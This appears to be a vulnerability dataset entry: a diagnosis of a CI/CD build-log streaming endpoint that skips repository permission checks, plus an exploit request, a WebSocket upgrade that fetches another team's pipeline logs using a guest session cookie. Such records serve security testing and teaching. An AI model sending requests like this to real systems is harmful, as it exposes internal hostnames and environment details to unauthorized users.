diagnosis: The CI/CD pipeline build log streaming subscription accepts an arbitrary pipelineRunId from the client and immediately attaches an observable to the buildLogEmitter. It neglects to check whether the authenticated user has read permissions on the repository or organization owning the pipeline run, allowing unauthorized developers to view build logs that may contain internal hostnames, test outputs, and unmasked environment details.
exploit_request:
GET /trpc/buildLog.streamPipelineLogs?input=%7B%22pipelineRunId%22%3A%22run_secops_deploy_8842%22%7D HTTP/1.1
Host: cicd.devcloud.internal
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Cookie: auth_session=guest_dev_session
